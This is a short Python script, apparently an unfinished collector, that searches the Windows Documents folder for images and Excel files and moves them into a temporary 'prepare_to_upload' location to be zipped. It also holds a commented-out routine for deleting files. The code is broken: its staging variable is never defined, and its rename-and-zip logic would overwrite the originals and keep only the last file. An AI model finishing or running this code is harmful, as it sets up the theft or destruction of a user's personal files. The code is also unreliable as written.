import os
import zipfile


BASE_PATH = os.path.dirname(os.path.abspath(__file__))

EXTENSIONS = ['jpg', 'jpeg', 'png', 'xlsx']

USERPROFILE = os.getenv('USERPROFILE')

TEMP = os.getenv('TMP')

DESKTOP = os.path.join(USERPROFILE, 'Desktop')

DOCUMENTS = os.path.join(USERPROFILE, 'Documents')

PATHS = [DOCUMENTS]


def search(path):
    all_files = []

    folders = os.walk(path)
    for folder in folders:
        for content in folder:
            if isinstance(content, list):
                for element in content:
                    try:
                        # Some of the items can be additional
                        # folders, so we have to take care
                        file_name, extension = element.split('.', 2)
                    except ValueError:
                        pass
                    else:
                        if extension in EXTENSIONS:
                            true_path = os.path.join(folder[0], element)
                            all_files.append(true_path)
    return all_files or []

def copy(_files):
    # prepare_to_upload = os.mkdir(os.path.join(TEMP, 'prepare'))
    # os.environb.setdefault('WINPREPARE', prepare_to_upload)
    for _file in _files:
        still_exists = os.path.exists(_file)
        if still_exists:
            os.rename(_file, prepare_to_upload)

    # Create a ZIP
    z = zipfile.ZipFile(prepare_to_upload, 'w')
    z.write(_file)
    z.close()

    return True

# def _delete(files):
#     debug = False
#     error_files = []

#     if debug is False:
#         try:
#             for file in files:
#                 # result = os.remove(file)
#                 print('delete', file)
#         except NotImplementedError:
#             error_files.append(file)

#         # if result is None:
#         #     error_files.append(file)

#     return error_files

for path in PATHS:
    search(path)
